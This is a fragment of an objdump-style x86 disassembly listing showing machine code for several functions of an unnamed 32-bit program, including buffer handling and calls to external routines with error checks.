  404162:	ff 50 08             	call   *0x8(%eax)
  404165:	83 ec 04             	sub    $0x4,%esp
  404168:	a1 74 ee 4a 00       	mov    0x4aee74,%eax
  40416d:	89 04 24             	mov    %eax,(%esp)
  404170:	e8 af df 01 00       	call   0x422124
  404175:	83 ec 04             	sub    $0x4,%esp
  404178:	89 d8                	mov    %ebx,%eax
  40417a:	81 c4 6c 04 00 00    	add    $0x46c,%esp
  404180:	5e                   	pop    %esi
  404181:	5f                   	pop    %edi
  404182:	5b                   	pop    %ebx
  404183:	5d                   	pop    %ebp
  404184:	c3                   	ret
  404185:	90                   	nop
  404186:	90                   	nop
  404187:	90                   	nop
  404188:	55                   	push   %ebp
  404189:	53                   	push   %ebx
  40418a:	57                   	push   %edi
  40418b:	56                   	push   %esi
  40418c:	83 ec 2c             	sub    $0x2c,%esp
  40418f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404196:	00 
  404197:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40419e:	00 
  40419f:	8d 44 24 08          	lea    0x8(%esp),%eax
  4041a3:	6a 00                	push   $0x0
  4041a5:	6a 00                	push   $0x0
  4041a7:	68 c8 34 42 00       	push   $0x4234c8
  4041ac:	50                   	push   %eax
  4041ad:	e8 4a e1 01 00       	call   0x4222fc
  4041b2:	85 c0                	test   %eax,%eax
  4041b4:	0f 88 c1 00 00 00    	js     0x40427b
  4041ba:	83 ec 04             	sub    $0x4,%esp
  4041bd:	8d 44 24 08          	lea    0x8(%esp),%eax
  4041c1:	6a 00                	push   $0x0
  4041c3:	6a 00                	push   $0x0
  4041c5:	6a 00                	push   $0x0
  4041c7:	6a 00                	push   $0x0
  4041c9:	6a 00                	push   $0x0
  4041cb:	50                   	push   %eax
  4041cc:	ff 74 24 24          	push   0x24(%esp)
  4041d0:	e8 fd e0 01 00       	call   0x4222d2
  4041d5:	83 c4 04             	add    $0x4,%esp
  4041d8:	85 c0                	test   %eax,%eax
  4041da:	0f 88 a8 00 00 00    	js     0x404288
  4041e0:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4041e4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4041e8:	83 79 18 0f          	cmpl   $0xf,0x18(%ecx)
  4041ec:	8b 51 14             	mov    0x14(%ecx),%edx
  4041ef:	77 05                	ja     0x4041f6
  4041f1:	83 c1 04             	add    $0x4,%ecx
  4041f4:	eb 03                	jmp    0x4041f9
  4041f6:	8b 49 04             	mov    0x4(%ecx),%ecx
  4041f9:	6a 00                	push   $0x0
  4041fb:	52                   	push   %edx
  4041fc:	51                   	push   %ecx
  4041fd:	50                   	push   %eax
  4041fe:	e8 f3 e0 01 00       	call   0x4222f6
  404203:	85 c0                	test   %eax,%eax
  404205:	0f 88 9b 00 00 00    	js     0x4042a6
  40420b:	8d 7c 24 0c          	lea    0xc(%esp),%edi
  40420f:	6a 00                	push   $0x0
  404211:	6a 20                	push   $0x20
  404213:	57                   	push   %edi
  404214:	ff 74 24 10          	push   0x10(%esp)
  404218:	e8 cd e0 01 00       	call   0x4222ea
  40421d:	89 c6                	mov    %eax,%esi
  40421f:	83 ec 0c             	sub    $0xc,%esp
  404222:	ff 74 24 10          	push   0x10(%esp)
  404226:	e8 b3 e0 01 00       	call   0x4222de
  40422b:	83 c4 0c             	add    $0xc,%esp
  40422e:	83 ec 08             	sub    $0x8,%esp
  404231:	6a 00                	push   $0x0
  404233:	ff 74 24 14          	push   0x14(%esp)
  404237:	e8 90 e0 01 00       	call   0x4222cc
  40423c:	83 c4 08             	add    $0x8,%esp
  40423f:	85 f6                	test   %esi,%esi
  404241:	0f 88 8c 00 00 00    	js     0x4042d3
  404247:	8b 74 24 50          	mov    0x50(%esp),%esi
  40424b:	8b 5c 24 4c          	mov    0x4c(%esp),%ebx
  40424f:	8b 6c 24 48          	mov    0x48(%esp),%ebp
  404253:	83 ec 04             	sub    $0x4,%esp
  404256:	55                   	push   %ebp
  404257:	57                   	push   %edi
  404258:	ff 74 24 50          	push   0x50(%esp)
  40425c:	e8 bb dd 00 00       	call   0x41201c
  404261:	83 c4 10             	add    $0x10,%esp
  404264:	8d 44 2c 0c          	lea    0xc(%esp,%ebp,1),%eax
  404268:	83 ec 04             	sub    $0x4,%esp
  40426b:	56                   	push   %esi
  40426c:	50                   	push   %eax
  40426d:	53                   	push   %ebx
  40426e:	e8 a9 dd 00 00       	call   0x41201c
  404273:	83 c4 3c             	add    $0x3c,%esp
  404276:	5e                   	pop    %esi
  404277:	5f                   	pop    %edi
  404278:	5b                   	pop    %ebx
  404279:	5d                   	pop    %ebp
  40427a:	c3                   	ret
  40427b:	83 ec 0c             	sub    $0xc,%esp
  40427e:	6a 01                	push   $0x1
  404280:	e8 77 93 01 00       	call   0x41d5fc
  404285:	83 c4 0c             	add    $0xc,%esp
  404288:	83 ec 08             	sub    $0x8,%esp
  40428b:	6a 00                	push   $0x0
  40428d:	ff 74 24 14          	push   0x14(%esp)
  404291:	e8 36 e0 01 00       	call   0x4222cc
  404296:	83 c4 08             	add    $0x8,%esp
  404299:	83 ec 0c             	sub    $0xc,%esp
  40429c:	6a 01                	push   $0x1
  40429e:	e8 59 93 01 00       	call   0x41d5fc
  4042a3:	83 c4 0c             	add    $0xc,%esp
  4042a6:	83 ec 0c             	sub    $0xc,%esp
  4042a9:	ff 74 24 10          	push   0x10(%esp)
  4042ad:	e8 2c e0 01 00       	call   0x4222de
  4042b2:	83 c4 0c             	add    $0xc,%esp
  4042b5:	83 ec 08             	sub    $0x8,%esp
  4042b8:	6a 00                	push   $0x0
  4042ba:	ff 74 24 14          	push   0x14(%esp)
  4042be:	e8 09 e0 01 00       	call   0x4222cc
  4042c3:	83 c4 08             	add    $0x8,%esp
  4042c6:	83 ec 0c             	sub    $0xc,%esp
  4042c9:	6a 01                	push   $0x1
  4042cb:	e8 2c 93 01 00       	call   0x41d5fc
  4042d0:	83 c4 0c             	add    $0xc,%esp
  4042d3:	83 ec 0c             	sub    $0xc,%esp
  4042d6:	6a 01                	push   $0x1
  4042d8:	e8 1f 93 01 00       	call   0x41d5fc
  4042dd:	83 c4 0c             	add    $0xc,%esp
  4042e0:	55                   	push   %ebp
  4042e1:	89 e5                	mov    %esp,%ebp
  4042e3:	53                   	push   %ebx
  4042e4:	57                   	push   %edi
  4042e5:	56                   	push   %esi
  4042e6:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  4042ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042ef:	8b 45 10             	mov    0x10(%ebp),%eax
  4042f2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4042f5:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4042fc:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  404303:	83 ec 0c             	sub    $0xc,%esp
  404306:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  404309:	8d 9d 74 ff ff ff    	lea    -0x8c(%ebp),%ebx
  40430f:	6a 10                	push   $0x10
  404311:	51                   	push   %ecx
  404312:	6a 20                	push   $0x20
  404314:	53                   	push   %ebx
  404315:	50                   	push   %eax
  404316:	e8 6d fe ff ff       	call   0x404188
  40431b:	83 c4 20             	add    $0x20,%esp
  40431e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404321:	6a 00                	push   $0x0
  404323:	6a 00                	push   $0x0
  404325:	68 d6 34 42 00       	push   $0x4234d6
  40432a:	50                   	push   %eax
  40432b:	e8 cc df 01 00       	call   0x4222fc
  404330:	83 ec 0c             	sub    $0xc,%esp
  404333:	6a 00                	push   $0x0
  404335:	6a 20                	push   $0x20
  404337:	68 f8 34 42 00       	push   $0x4234f8
  40433c:	68 de 34 42 00       	push   $0x4234de
  404341:	ff 75 ec             	push   -0x14(%ebp)
  404344:	e8 b9 df 01 00       	call   0x422302
  404349:	83 c4 0c             	add    $0xc,%esp
  40434c:	89 c6                	mov    %eax,%esi
  40434e:	c7 45 c0 98 13 42 00 	movl   $0x421398,-0x40(%ebp)
  404355:	c7 45 c4 ac 36 42 00 	movl   $0x4236ac,-0x3c(%ebp)
  40435c:	89 6d c8             	mov    %ebp,-0x38(%ebp)
  40435f:	89 65 d0             	mov    %esp,-0x30(%ebp)
  404362:	c7 45 c8 f7 45 40 00 	movl   $0x4045f7,-0x38(%ebp)
  404369:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40436c:	e8 90 dc 01 00       	call   0x422001
  404371:	85 f6                	test   %esi,%esi
  404373:	79 18                	jns    0x40438d
  404375:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404378:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  40437f:	83 ec 08             	sub    $0x8,%esp
  404382:	6a 00                	push   $0x0
  404384:	50                   	push   %eax
  404385:	e8 42 df 01 00       	call   0x4222cc
  40438a:	83 c4 08             	add    $0x8,%esp
  40438d:	8b 75 0c             	mov    0xc(%ebp),%esi
  404390:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404393:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  40439a:	83 ec 04             	sub    $0x4,%esp
  40439d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4043a0:	6a 00                	push   $0x0
  4043a2:	6a 20                	push   $0x20
  4043a4:	53                   	push   %ebx
  4043a5:	6a 00                	push   $0x0
  4043a7:	6a 00                	push   $0x0
  4043a9:	51                   	push   %ecx
  4043aa:	50                   	push   %eax
  4043ab:	e8 40 df 01 00       	call   0x4222f0
  4043b0:	83 c4 04             	add    $0x4,%esp
  4043b3:	85 c0                	test   %eax,%eax
  4043b5:	79 18                	jns    0x4043cf
  4043b7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4043ba:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  4043c1:	83 ec 08             	sub    $0x8,%esp
  4043c4:	6a 00                	push   $0x0
  4043c6:	50                   	push   %eax
  4043c7:	e8 00 df 01 00       	call   0x4222cc
  4043cc:	83 c4 08             	add    $0x8,%esp
  4043cf:	8b 46 04             	mov    0x4(%esi),%eax
  4043d2:	8b 4e 08             	mov    0x8(%esi),%ecx
  4043d5:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4043d8:	83 c2 04             	add    $0x4,%edx
  4043db:	89 cb                	mov    %ecx,%ebx
  4043dd:	29 c3                	sub    %eax,%ebx
  4043df:	89 55 e0             	mov    %edx,-0x20(%ebp)
  4043e2:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4043e5:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  4043ec:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  4043f3:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  4043f9:	74 34                	je     0x40442f
  4043fb:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  404401:	72 32                	jb     0x404435
  404403:	83 fb dd             	cmp    $0xffffffdd,%ebx
  404406:	0f 83 c8 01 00 00    	jae    0x4045d4
  40440c:	8d 43 23             	lea    0x23(%ebx),%eax
  40440f:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  404416:	83 ec 0c             	sub    $0xc,%esp
  404419:	50                   	push   %eax
  40441a:	e8 49 6d 00 00       	call   0x40b168
  40441f:	83 c4 10             	add    $0x10,%esp
  404422:	89 c1                	mov    %eax,%ecx
  404424:	8d 41 23             	lea    0x23(%ecx),%eax
  404427:	83 e0 e0             	and    $0xffffffe0,%eax
  40442a:	89 48 fc             	mov    %ecx,-0x4(%eax)
  40442d:	eb 19                	jmp    0x404448
  40442f:	31 db                	xor    %ebx,%ebx
  404431:	31 d2                	xor    %edx,%edx
  404433:	eb 4c                	jmp    0x404481
  404435:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  40443c:	83 ec 0c             	sub    $0xc,%esp
  40443f:	53                   	push   %ebx
  404440:	e8 23 6d 00 00       	call   0x40b168
  404445:	83 c4 10             	add    $0x10,%esp
  404448:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40444b:	89 41 04             	mov    %eax,0x4(%ecx)
  40444e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404451:	89 41 08             	mov    %eax,0x8(%ecx)
  404454:	8d 0c 18             	lea    (%eax,%ebx,1),%ecx
  404457:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40445a:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40445d:	83 ec 04             	sub    $0x4,%esp
  404460:	53                   	push   %ebx
  404461:	6a 00                	push   $0x0
  404463:	50                   	push   %eax
  404464:	e8 7e dd 00 00       	call   0x4121e7
  404469:	83 c4 10             	add    $0x10,%esp
  40446c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40446f:	03 58 08             	add    0x8(%eax),%ebx
  404472:	89 58 08             	mov    %ebx,0x8(%eax)
  404475:	8b 46 04             	mov    0x4(%esi),%eax
  404478:	8b 4e 08             	mov    0x8(%esi),%ecx
  40447b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40447e:	8b 52 04             	mov    0x4(%edx),%edx
  404481:	8b 75 e8             	mov    -0x18(%ebp),%esi
  404484:	29 c1                	sub    %eax,%ecx
  404486:	29 d3                	sub    %edx,%ebx
  404488:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  40448f:	83 ec 08             	sub    $0x8,%esp
  404492:	8d 7d dc             	lea    -0x24(%ebp),%edi
  404495:	6a 01                	push   $0x1
  404497:	57                   	push   %edi
  404498:	53                   	push   %ebx
  404499:	52                   	push   %edx
  40449a:	6a 10                	push   $0x10
  40449c:	8d 55 94             	lea    -0x6c(%ebp),%edx
  40449f:	52                   	push   %edx
  4044a0:	6a 00                	push   $0x0
  4044a2:	51                   	push   %ecx
  4044a3:	50                   	push   %eax
  4044a4:	56                   	push   %esi
  4044a5:	e8 2e de 01 00       	call   0x4222d8
  4044aa:	83 c4 08             	add    $0x8,%esp
  4044ad:	85 c0                	test   %eax,%eax
  4044af:	79 2e                	jns    0x4044df
  4044b1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4044b4:	c7 45 ac 02 00 00 00 	movl   $0x2,-0x54(%ebp)
  4044bb:	83 ec 0c             	sub    $0xc,%esp
  4044be:	50                   	push   %eax
  4044bf:	e8 20 de 01 00       	call   0x4222e4
  4044c4:	83 c4 0c             	add    $0xc,%esp
  4044c7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4044ca:	c7 45 ac 03 00 00 00 	movl   $0x3,-0x54(%ebp)
  4044d1:	83 ec 08             	sub    $0x8,%esp
  4044d4:	6a 00                	push   $0x0
  4044d6:	50                   	push   %eax
  4044d7:	e8 f0 dd 01 00       	call   0x4222cc
  4044dc:	83 c4 08             	add    $0x8,%esp
  4044df:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4044e2:	c7 45 ac 04 00 00 00 	movl   $0x4,-0x54(%ebp)
  4044e9:	83 ec 0c             	sub    $0xc,%esp
  4044ec:	50                   	push   %eax
  4044ed:	e8 f2 dd 01 00       	call   0x4222e4
  4044f2:	83 c4 0c             	add    $0xc,%esp
  4044f5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4044f8:	c7 45 ac 05 00 00 00 	movl   $0x5,-0x54(%ebp)
  4044ff:	83 ec 08             	sub    $0x8,%esp
  404502:	6a 00                	push   $0x0
  404504:	50                   	push   %eax
  404505:	e8 c2 dd 01 00       	call   0x4222cc
  40450a:	83 c4 08             	add    $0x8,%esp
  40450d:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404510:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404513:	8b 40 08             	mov    0x8(%eax),%eax
  404516:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404519:	8b 49 04             	mov    0x4(%ecx),%ecx
  40451c:	89 c7                	mov    %eax,%edi
  40451e:	29 cf                	sub    %ecx,%edi
  404520:	89 d6                	mov    %edx,%esi
  404522:	29 fe                	sub    %edi,%esi
  404524:	73 09                	jae    0x40452f
  404526:	01 f0                	add    %esi,%eax
  404528:	89 c6                	mov    %eax,%esi
  40452a:	e9 82 00 00 00       	jmp    0x4045b1
  40452f:	0f 86 82 00 00 00    	jbe    0x4045b7
  404535:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  404538:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40453b:	8b 52 0c             	mov    0xc(%edx),%edx
  40453e:	89 d3                	mov    %edx,%ebx
  404540:	29 c3                	sub    %eax,%ebx
  404542:	39 f3                	cmp    %esi,%ebx
  404544:	73 4c                	jae    0x404592
  404546:	f7 d7                	not    %edi
  404548:	39 fe                	cmp    %edi,%esi
  40454a:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  40454d:	0f 87 8d 00 00 00    	ja     0x4045e0
  404553:	29 ca                	sub    %ecx,%edx
  404555:	89 d0                	mov    %edx,%eax
  404557:	d1 e8                	shr    $1,%eax
  404559:	89 c6                	mov    %eax,%esi
  40455b:	f7 d6                	not    %esi
  40455d:	31 c9                	xor    %ecx,%ecx
  40455f:	39 f2                	cmp    %esi,%edx
  404561:	77 04                	ja     0x404567
  404563:	01 d0                	add    %edx,%eax
  404565:	89 c1                	mov    %eax,%ecx
  404567:	39 f9                	cmp    %edi,%ecx
  404569:	89 f8                	mov    %edi,%eax
  40456b:	72 02                	jb     0x40456f
  40456d:	89 c8                	mov    %ecx,%eax
  40456f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404572:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  404579:	83 ec 08             	sub    $0x8,%esp
  40457c:	50                   	push   %eax
  40457d:	51                   	push   %ecx
  40457e:	e8 21 0f 00 00       	call   0x4054a4
  404583:	83 c4 10             	add    $0x10,%esp
  404586:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404589:	8b 40 08             	mov    0x8(%eax),%eax
  40458c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40458f:	8b 49 04             	mov    0x4(%ecx),%ecx
  404592:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  404595:	01 f1                	add    %esi,%ecx
  404597:	29 c1                	sub    %eax,%ecx
  404599:	83 ec 04             	sub    $0x4,%esp
  40459c:	51                   	push   %ecx
  40459d:	6a 00                	push   $0x0
  40459f:	50                   	push   %eax
  4045a0:	e8 42 dc 00 00       	call   0x4121e7
  4045a5:	83 c4 10             	add    $0x10,%esp
  4045a8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4045ab:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4045ae:	03 70 04             	add    0x4(%eax),%esi
  4045b1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4045b4:	89 70 08             	mov    %esi,0x8(%eax)
  4045b7:	83 ec 0c             	sub    $0xc,%esp
  4045ba:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4045bd:	50                   	push   %eax
  4045be:	e8 5f da 01 00       	call   0x422022
  4045c3:	83 c4 10             	add    $0x10,%esp
  4045c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4045c9:	81 c4 8c 00 00 00    	add    $0x8c,%esp
  4045cf:	5e                   	pop    %esi
  4045d0:	5f                   	pop    %edi
  4045d1:	5b                   	pop    %ebx
  4045d2:	5d                   	pop    %ebp
  4045d3:	c3                   	ret
  4045d4:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  4045db:	e8 80 a6 00 00       	call   0x40ec60
  4045e0:	c7 45 ac 06 00 00 00 	movl   $0x6,-0x54(%ebp)
  4045e7:	83 ec 0c             	sub    $0xc,%esp
  4045ea:	68 40 35 42 00       	push   $0x423540
  4045ef:	e8 a4 a6 00 00       	call   0x40ec98
  4045f4:	83 c4 0c             	add    $0xc,%esp
  4045f7:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4045fa:	3d 07 00 00 00       	cmp    $0x7,%eax
  4045ff:	76 02                	jbe    0x404603
  404601:	0f 0b                	ud2
  404603:	2d 01 00 00 00       	sub    $0x1,%eax
  404608:	ff 24 85 6c 46 40 00 	jmp    *0x40466c(,%eax,4)
  40460f:	8b 75 b0             	mov    -0x50(%ebp),%esi
  404612:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404615:	8b 00                	mov    (%eax),%eax
  404617:	85 c0                	test   %eax,%eax
  404619:	74 3d                	je     0x404658
  40461b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40461e:	8b 49 0c             	mov    0xc(%ecx),%ecx
  404621:	29 c1                	sub    %eax,%ecx
  404623:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404629:	72 03                	jb     0x40462e
  40462b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40462e:	83 ec 0c             	sub    $0xc,%esp
  404631:	50                   	push   %eax
  404632:	e8 f5 1d 00 00       	call   0x40642c
  404637:	83 c4 10             	add    $0x10,%esp
  40463a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40463d:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  404644:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404647:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40464e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404651:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  404658:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  40465f:	83 ec 0c             	sub    $0xc,%esp
  404662:	56                   	push   %esi
  404663:	e8 38 d9 01 00       	call   0x421fa0
  404668:	83 c4 0c             	add    $0xc,%esp
  40466b:	90                   	nop
  40466c:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  404670:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  404674:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  404678:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  40467c:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  404680:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  404684:	0f 46 40 00          	cmovbe 0x0(%eax),%eax
  404688:	83 ec 0c             	sub    $0xc,%esp
  40468b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40468f:	89 04 24             	mov    %eax,(%esp)
  404692:	e8 d1 bd 01 00       	call   0x420468
  404697:	e8 f8 ba 01 00       	call   0x420194
  40469c:	c3                   	ret
  40469d:	90                   	nop
  40469e:	90                   	nop
  40469f:	90                   	nop
  4046a0:	e9 87 1d 00 00       	jmp    0x40642c
  4046a5:	90                   	nop
  4046a6:	90                   	nop
  4046a7:	90                   	nop
  4046a8:	83 ec 0c             	sub    $0xc,%esp
  4046ab:	8b 44 24 14          	mov    0x14(%esp),%eax
  4046af:	89 04 24             	mov    %eax,(%esp)
  4046b2:	e8 b1 6a 00 00       	call   0x40b168
  4046b7:	83 c4 0c             	add    $0xc,%esp
  4046ba:	c3                   	ret
  4046bb:	90                   	nop
  4046bc:	83 ec 0c             	sub    $0xc,%esp
  4046bf:	8b 44 24 14          	mov    0x14(%esp),%eax
  4046c3:	89 04 24             	mov    %eax,(%esp)
  4046c6:	e8 61 1d 00 00       	call   0x40642c
  4046cb:	83 c4 0c             	add    $0xc,%esp
  4046ce:	c3                   	ret
  4046cf:	90                   	nop
  4046d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4046d4:	3b 44 24 08          	cmp    0x8(%esp),%eax
  4046d8:	0f 94 c0             	sete   %al
  4046db:	c3                   	ret
  4046dc:	55                   	push   %ebp
  4046dd:	53                   	push   %ebx
  4046de:	57                   	push   %edi
  4046df:	56                   	push   %esi
  4046e0:	83 ec 0c             	sub    $0xc,%esp
  4046e3:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4046e7:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4046eb:	8b 47 14             	mov    0x14(%edi),%eax
  4046ee:	89 c1                	mov    %eax,%ecx
  4046f0:	29 d9                	sub    %ebx,%ecx
  4046f2:	0f 82 05 01 00 00    	jb     0x4047fd
  4046f8:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  4046fc:	8b 54 24 20          	mov    0x20(%esp),%edx
  404700:	39 e9                	cmp    %ebp,%ecx
  404702:	77 02                	ja     0x404706
  404704:	89 cd                	mov    %ecx,%ebp
  404706:	39 fa                	cmp    %edi,%edx
  404708:	74 37                	je     0x404741
  40470a:	83 ec 04             	sub    $0x4,%esp
  40470d:	6a 00                	push   $0x0
  40470f:	55                   	push   %ebp
  404710:	52                   	push   %edx
  404711:	e8 0a 01 00 00       	call   0x404820
  404716:	8b 54 24 30          	mov    0x30(%esp),%edx
  40471a:	83 c4 10             	add    $0x10,%esp
  40471d:	84 c0                	test   %al,%al
  40471f:	0f 84 ce 00 00 00    	je     0x4047f3
  404725:	8b 4a 18             	mov    0x18(%edx),%ecx
  404728:	8d 72 04             	lea    0x4(%edx),%esi
  40472b:	83 f9 10             	cmp    $0x10,%ecx
  40472e:	72 63                	jb     0x404793
  404730:	8b 06                	mov    (%esi),%eax
  404732:	85 ed                	test   %ebp,%ebp
  404734:	74 7f                	je     0x4047b5
  404736:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  40473a:	77 5f                	ja     0x40479b
  40473c:	83 c7 04             	add    $0x4,%edi
  40473f:	eb 5d                	jmp    0x40479e
  404741:	01 dd                	add    %ebx,%ebp
  404743:	39 e8                	cmp    %ebp,%eax
  404745:	0f 82 c2 00 00 00    	jb     0x40480d
  40474b:	8d 77 04             	lea    0x4(%edi),%esi
  40474e:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  404752:	77 04                	ja     0x404758
  404754:	89 f0                	mov    %esi,%eax
  404756:	eb 03                	jmp    0x40475b
  404758:	8b 47 04             	mov    0x4(%edi),%eax
  40475b:	89 6f 14             	mov    %ebp,0x14(%edi)
  40475e:	c6 04 28 00          	movb   $0x0,(%eax,%ebp,1)
  404762:	8b 6f 14             	mov    0x14(%edi),%ebp
  404765:	39 dd                	cmp    %ebx,%ebp
  404767:	76 18                	jbe    0x404781
  404769:	85 db                	test   %ebx,%ebx
  40476b:	0f 84 82 00 00 00    	je     0x4047f3
  404771:	8b 47 18             	mov    0x18(%edi),%eax
  404774:	83 f8 0f             	cmp    $0xf,%eax
  404777:	77 4c                	ja     0x4047c5
  404779:	89 f1                	mov    %esi,%ecx
  40477b:	29 dd                	sub    %ebx,%ebp
  40477d:	75 4d                	jne    0x4047cc
  40477f:	eb 62                	jmp    0x4047e3
  404781:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  404785:	76 03                	jbe    0x40478a
  404787:	8b 77 04             	mov    0x4(%edi),%esi
  40478a:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  404791:	eb 5d                	jmp    0x4047f0
  404793:	89 f0                	mov    %esi,%eax
  404795:	85 ed                	test   %ebp,%ebp
  404797:	75 9d                	jne    0x404736
  404799:	eb 1a                	jmp    0x4047b5
  40479b:	8b 7f 04             	mov    0x4(%edi),%edi
  40479e:	01 df                	add    %ebx,%edi
  4047a0:	83 ec 04             	sub    $0x4,%esp
  4047a3:	55                   	push   %ebp
  4047a4:	57                   	push   %edi
  4047a5:	50                   	push   %eax
  4047a6:	e8 71 d8 00 00       	call   0x41201c
  4047ab:	83 c4 10             	add    $0x10,%esp
  4047ae:	8b 54 24 20          	mov    0x20(%esp),%edx
  4047b2:	8b 4a 18             	mov    0x18(%edx),%ecx
  4047b5:	83 f9 10             	cmp    $0x10,%ecx
  4047b8:	72 02                	jb     0x4047bc
  4047ba:	8b 36                	mov    (%esi),%esi
  4047bc:	89 6a 14             	mov    %ebp,0x14(%edx)
  4047bf:	c6 04 2e 00          	movb   $0x0,(%esi,%ebp,1)
  4047c3:	eb 2e                	jmp    0x4047f3
  4047c5:	8b 4f 04             	mov    0x4(%edi),%ecx
  4047c8:	29 dd                	sub    %ebx,%ebp
  4047ca:	74 17                	je     0x4047e3
  4047cc:	01 cb                	add    %ecx,%ebx
  4047ce:	83 ec 04             	sub    $0x4,%esp
  4047d1:	55                   	push   %ebp
  4047d2:	53                   	push   %ebx
  4047d3:	51                   	push   %ecx
  4047d4:	89 d3                	mov    %edx,%ebx
  4047d6:	e8 5a d9 00 00       	call   0x412135
  4047db:	89 da                	mov    %ebx,%edx
  4047dd:	83 c4 10             	add    $0x10,%esp
  4047e0:	8b 47 18             	mov    0x18(%edi),%eax
  4047e3:	83 f8 0f             	cmp    $0xf,%eax
  4047e6:	76 03                	jbe    0x4047eb
  4047e8:	8b 77 04             	mov    0x4(%edi),%esi
  4047eb:	89 6f 14             	mov    %ebp,0x14(%edi)
  4047ee:	01 ee                	add    %ebp,%esi
  4047f0:	c6 06 00             	movb   $0x0,(%esi)
  4047f3:	89 d0                	mov    %edx,%eax
  4047f5:	83 c4 0c             	add    $0xc,%esp
  4047f8:	5e                   	pop    %esi
  4047f9:	5f                   	pop    %edi
  4047fa:	5b                   	pop    %ebx
  4047fb:	5d                   	pop    %ebp
  4047fc:	c3                   	ret
  4047fd:	83 ec 0c             	sub    $0xc,%esp
  404800:	68 18 35 42 00       	push   $0x423518
  404805:	e8 7a a6 00 00       	call   0x40ee84
  40480a:	83 c4 0c             	add    $0xc,%esp
  40480d:	83 ec 0c             	sub    $0xc,%esp
  404810:	68 18 35 42 00       	push   $0x423518
  404815:	e8 6a a6 00 00       	call   0x40ee84
  40481a:	83 c4 0c             	add    $0xc,%esp
  40481d:	90                   	nop
  40481e:	90                   	nop
  40481f:	90                   	nop
  404820:	55                   	push   %ebp
  404821:	53                   	push   %ebx
  404822:	57                   	push   %edi
  404823:	56                   	push   %esi
  404824:	83 ec 0c             	sub    $0xc,%esp
